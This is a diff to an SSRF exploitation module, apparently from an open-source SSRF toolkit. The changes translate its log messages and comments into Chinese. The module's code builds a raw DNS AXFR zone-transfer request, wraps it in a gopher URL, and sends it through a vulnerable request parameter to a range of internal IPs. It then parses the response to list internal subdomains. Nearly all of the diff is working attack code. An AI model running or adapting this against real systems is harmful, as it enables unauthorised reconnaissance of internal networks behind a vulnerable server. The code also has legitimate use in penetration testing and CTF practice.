@@ -5,7 +5,7 @@ from urllib.parse import quote
 from core.utils import gen_ip_list, wrapper_gopher
 
 name = "axfr"
-description = "AXFR DNS"
+description = "DNS AXFR 区域传送"
 author = "Swissky"
 documentation = [
     "https://vozec.fr/writeups/pong-fcsc2024-en/",
@@ -20,9 +20,9 @@ class exploit:
     SERVER_DOMAIN = "example.lab"
 
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
 
-        # Handle args for custom DNS target
+        # 处理自定义 DNS 目标参数
         if args.lhost is not None:
             self.SERVER_HOST = args.lhost
         if args.lport is not None:
@@ -30,12 +30,12 @@ class exploit:
         if args.ldomain is not None:
             self.SERVER_DOMAIN = args.ldomain
 
-        # Using a generator to create the host list
+        # 使用生成器创建主机列表
         gen_host = gen_ip_list(self.SERVER_HOST, args.level)
         for ip in gen_host:
             domain, tld = self.SERVER_DOMAIN.split(".")
 
-            # DNS AXFR - TCP packet format
+            # DNS AXFR - TCP 报文格式
             dns_request = b"\x01\x03\x03\x07"  # BITMAP
             dns_request += b"\x00\x01"  # QCOUNT
             dns_request += b"\x00\x00"  # ANCOUNT
@@ -54,38 +54,38 @@ class exploit:
 
             payload = wrapper_gopher(quote(dns_request), ip, self.SERVER_PORT)
 
-            # Send the payload
+            # 发送 payload
             r = requester.do_request(args.param, payload)
             self.parse_output(r.text)
 
     def parse_output(self, data):
-        # removing header part
+        # 去掉头部部分
         lheader = len(b"\x00" + b"\x6a" + b"\x01\x03" + b"\xef\xbf\xbd" + b"\xef\xbf\xbd" + b"\x00")
         lother = len(b"\x01\x00" + b"\x03" + b"\x00\x00\x00\x00")
         hex_output = binascii.hexlify(data.encode())
         hex_output = hex_output[(lheader + lother) * 2 :]
         data = binascii.unhexlify(hex_output)
 
-        # extracting size
+        # 提取长度
         domain_size = data[0]
         domain = data[1 : domain_size + 1]
-        logging.debug(f"DOMAIN: {domain_size}, {domain.decode()}")
+        logging.debug(f"DOMAIN（域名）: {domain_size}, {domain.decode()}")
 
         tld_size = data[domain_size + 1]
         tld = data[domain_size + 2 : domain_size + 2 + tld_size]
-        logging.debug(f"TLD: {tld_size}, {tld.decode()}")
+        logging.debug(f"TLD（顶级域）: {tld_size}, {tld.decode()}")
 
-        # subdomains
+        # 子域名
         subdata = data[domain_size + 2 + tld_size :]
         subdata_arr = subdata.decode().split("�")
         for sub in subdata_arr:
             printable = self.bytes_to_printable_string(sub.encode())
             if printable != "":
-                logging.info(f"\033[32mSubdomain found\033[0m : {printable}")
+                logging.info(f"\033[32m发现子域名\033[0m : {printable}")
 
     def bytes_to_printable_string(self, byte_string):
-        # Filter out non-printable characters and decode the byte string
+        # 过滤不可打印字符并解码字节串
         printable_chars = (chr(byte) for byte in byte_string if chr(byte).isprintable())
-        # Concatenate the printable characters into a single string
+        # 将可打印字符合并为单个字符串
         printable_string = "".join(printable_chars)
         return printable_string
